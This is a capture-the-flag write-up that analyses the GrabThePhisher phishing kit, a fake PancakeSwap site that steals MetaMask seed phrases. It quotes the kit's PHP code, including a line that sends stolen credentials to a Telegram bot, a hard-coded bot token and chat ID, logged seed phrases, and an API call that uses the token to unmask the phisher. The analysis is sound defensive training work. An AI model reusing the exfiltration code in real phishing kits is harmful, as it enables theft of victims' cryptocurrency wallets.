---
layout: write_up
title: GrabThePhisher
---

## Introduction

With this post we will be discussing the solutions for the challenge [GrabThePhisher](https://cyberdefenders.org/blueteam-ctf-challenges/95) on Cyberdefenders.

<h4 style="padding-left:18px; padding-top:12px"> Tools </h4>
<div style="padding-left:18px;" markdown="1" id="tools-list">
There are no particular tools suggested for the completition of this challenge.

</div>

<br>

## Guide

As per the scenario explanation, we are given the phishing kit of an attacker that build up a fake [PancakeSwap](https://pancakeswap.finance/) website.

First question:

    Which wallet is used for asking the seed phrase?

Looking at the source code of `index.html` we can observe that all the wallets have, as a form `action`, a non-existent `send.php` page, except the <code class="flag">Metamask</code> wallet which points to `metamask/` -- that wallet is the flag.

<br>

    What is the file name that has the code for the phishing kit?

With a brief look at the contents of `metamask` folder we can notiche the file <code class="flag">metamask.php</code> -- it has an high chance of being the code of the phishing kit, and in fact looking at its content we can read that it sends the credentials to a Telegram bot.

<br>

    In which language was the kit written?

As per identified in the previous question, <code class="flag">PHP</code>.

<br>

    What service does the kit use to retrieve the victim's machine information?

Reading the source code of `metamask.php` we can notice the following lines:

```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
$date = date("m.d.Y");
```
Thus, the service used is <code class="flag">Sypex Geo</code>.

<br>

    How many seed phrases were already collected?

Reading the source code of `metamask.php` we can notice the following line:

```php
@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
```
So we understand that the attacker stores log data of the stolen wallets inside `/log/log.txt` (starting from the root folder of the server) -- let's open it:

```txt
number edge rebuild stomach review course sphere absurd memory among drastic total
bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
father also recycle embody balance concert mechanic believe owner pair muffin hockey

```
Thus, the number of stolen seed phrases is <code class="flag">3</code>.

<br>

    Write down the seed phrase of the most recent phishing incident?

As per the content read in the previous question, the last stolen seed phrase is <code class="flag">father also recycle embody balance concert mechanic believe owner pair muffin hockey</code>.

<br>

    Which medium had been used for credential dumping?

As anticipated a few questions before, the answer resides in the following lines:

```php
        $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
        file_get_contents($filename);
        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
```
Thus, the medium used for credential dumping is <code class="flag">Telegram</code>.

<br>

    What is the token for the channel?

As per the following line:

```php
$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
```
The answer is <code class="flag">5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10</code>.

<br>

    What is the chat ID of the phisher's channel?

As per the following line:

```php
$id = "5442785564";
```
The answer is <code class="flag">5442785564</code>.

<br>

    What are the allies of the phish kit developer?

Again, inside the PHP source code we can read the following lines:

```php
/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
  */
```
Thus, the flag is <code class="flag">j1j1b1s@m3r0</code>.

<br>

    What is the full name of the Phish Actor?

This is a little trickier and requires the use of the Telegram Bot API, in particular of the [getChat](https://core.telegram.org/bots/api#getchat) method: we have the chat ID (`5442785564`) of the attacker, we don't even need to register an account since we have the token of the bot as well (`5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`), so we just have to make an API call with the following URL:

```txt
https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
```

The output will be:

```json
{
    "ok":true,
    "result":
    {
        "id":5442785564,
        "first_name":"Marcus",
        "last_name":"Aurelius",
        "username":"pumpkinboii",
        "type":"private",
        "active_usernames":["pumpkinboii"]
    }
}
```
Thus, the full name is <code class="flag">Marcus Aurelius</code>. Last question!

<br>

    What is the username of the Phish Actor?

Using the output of the API call made previously, the answer is <code class="flag">pumpkinboii</code>.

<br>
<br>

We've reached the end of this challenge, and, consequently, of this guide as well! I hope it was useful and that you enjoyed it!